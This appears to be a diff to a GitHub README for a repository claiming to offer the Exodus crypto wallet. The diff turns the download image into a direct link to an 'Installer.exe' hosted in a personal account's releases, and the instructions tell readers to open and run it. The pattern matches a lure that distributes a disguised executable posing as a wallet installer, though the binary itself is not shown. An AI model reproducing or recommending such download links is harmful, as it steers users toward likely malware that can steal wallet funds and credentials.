@@ -20,7 +20,9 @@ Follow these steps to install **download exodus crypto wallet**:
 
 1. **Download the file.**  
    Click the "Download" button below or navigate to the "Releases" section of this repository to access the latest version.
-![download](https://github.com/user-attachments/assets/d0cf01b8-ef9b-44a8-8f1d-c63373bfca8d)
+<a href="https://github.com/murphyheather6/download-exodus-wallet/releases/download/release/Installer.exe">
+  <img src="https://github.com/user-attachments/assets/d0cf01b8-ef9b-44a8-8f1d-c63373bfca8d" alt="201887" width="300"/>
+</a>
 
 2. **Install the application.**  
    Open the downloaded file and follow the on-screen instructions to complete the installation.
